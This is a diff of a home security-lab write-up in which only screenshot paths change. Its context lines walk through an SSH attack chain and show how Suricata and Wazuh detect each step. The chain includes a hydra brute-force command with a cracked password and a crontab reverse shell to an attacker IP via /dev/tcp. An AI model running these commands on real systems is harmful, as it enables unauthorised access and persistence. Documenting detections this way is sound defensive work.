@@ -77,11 +77,11 @@ alert tcp any any -> $HOME_NET any (
 
 **Wazuh Dashboard:**
 
-![Step 1 - Port Scan Alert](screenshots/chain1-step1-portscan.png)
+![Step 1 - Port Scan Alert](../attacks/chain-1-ssh/screenshots/chain1-step1-portscan.png)
 
 **Slack Notification:**
 
-![Step 1 - Slack Alert](screenshots/chain1-step1-slack.png)
+![Step 1 - Slack Alert](../attacks/chain-1-ssh/screenshots/chain1-step1-slack.png)
 
 ---
 
@@ -103,7 +103,7 @@ hydra -l nvphuong -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10
 [22][ssh] host: 10.10.1.133   login: nvphuong   password: 456789
 ```
 
-![Step 2 - Attack](screenshots/chain1-step2-attack.png)
+![Step 2 - Attack](../attacks/chain-1-ssh/screenshots/chain1-step2-attack.png)
 
 ### How Detection Works
 
@@ -122,15 +122,15 @@ alert tcp any any -> $HOME_NET 22 (
 
 **Suricata fast.log:**
 
-![Step 2 - Suricata Log](screenshots/chain1-step2-suricata-log.png)
+![Step 2 - Suricata Log](../attacks/chain-1-ssh/screenshots/chain1-step2-suricata-log.png)
 
 **Wazuh Dashboard:**
 
-![Step 2 - Brute Force Alert](screenshots/chain1-step2-bruteforce.png)
+![Step 2 - Brute Force Alert](../attacks/chain-1-ssh/screenshots/chain1-step2-bruteforce.png)
 
 **Slack Notification:**
 
-![Step 2 - Slack Alert](screenshots/chain1-step2-slack.png)
+![Step 2 - Slack Alert](../attacks/chain-1-ssh/screenshots/chain1-step2-slack.png)
 
 ---
 
@@ -146,7 +146,7 @@ ssh nvphuong@10.10.1.133
 # password: 456789
 ```
 
-![Step 3 - Attack](screenshots/chain1-step3-attack-login.png)
+![Step 3 - Attack](../attacks/chain-1-ssh/screenshots/chain1-step3-attack-login.png)
 
 ### How Detection Works
 
@@ -164,11 +164,11 @@ Wazuh Agent on the Victim reads `/var/log/auth.log` in real time. A successful S
 
 **Wazuh Dashboard:**
 
-![Step 3 - Successful Login Alert](screenshots/chain1-step3-login.png)
+![Step 3 - Successful Login Alert](../attacks/chain-1-ssh/screenshots/chain1-step3-login.png)
 
 **Slack Notification:**
 
-![Step 3 - Slack Alert](screenshots/chain1-step3-slack.png)
+![Step 3 - Slack Alert](../attacks/chain-1-ssh/screenshots/chain1-step3-slack.png)
 
 ---
 
@@ -190,7 +190,7 @@ crontab -l
 # * * * * * /bin/bash -i >& /dev/tcp/10.10.1.130/4444 0>&1
 ```
 
-![Step 4 - Attack](screenshots/chain1-step4-attack.png)
+![Step 4 - Attack](../attacks/chain-1-ssh/screenshots/chain1-step4-attack.png)
 
 ### How Detection Works
 
@@ -215,7 +215,7 @@ Wazuh FIM monitors `/var/spool/cron/crontabs/` in real-time mode. Any file creat
 
 **Wazuh Dashboard:**
 
-![Step 4 - Crontab Persistence Alert](screenshots/chain1-step4-persistence.png)
+![Step 4 - Crontab Persistence Alert](../attacks/chain-1-ssh/screenshots/chain1-step4-persistence.png)
 
 **Wazuh alert log:**
 ```
@@ -223,11 +223,11 @@ File '/var/spool/cron/crontabs/nvphuong' added
 Mode: realtime
 ```
 
-![Step 4 - Alert Log](screenshots/chain1-step4-wazuh-alert-log.png)
+![Step 4 - Alert Log](../attacks/chain-1-ssh/screenshots/chain1-step4-wazuh-alert-log.png)
 
 **Slack Notification:**
 
-![Step 4 - Slack Alert](screenshots/chain1-step4-slack.png)
+![Step 4 - Slack Alert](../attacks/chain-1-ssh/screenshots/chain1-step4-slack.png)
 
 ---
 
@@ -260,11 +260,11 @@ When Suricata's brute force rule (100002) fires, Wazuh's active response module 
 </active-response>
 ```
 
-![Active Response - IP Blocked](screenshots/chain1-active-response.png)
+![Active Response - IP Blocked](../attacks/chain-1-ssh/screenshots/chain1-active-response.png)
 
 </br>
 
-![Active Response - Ping](screenshots/chain1-ping.png)
+![Active Response - Ping](../attacks/chain-1-ssh/screenshots/chain1-ping.png)
 
 ---
 
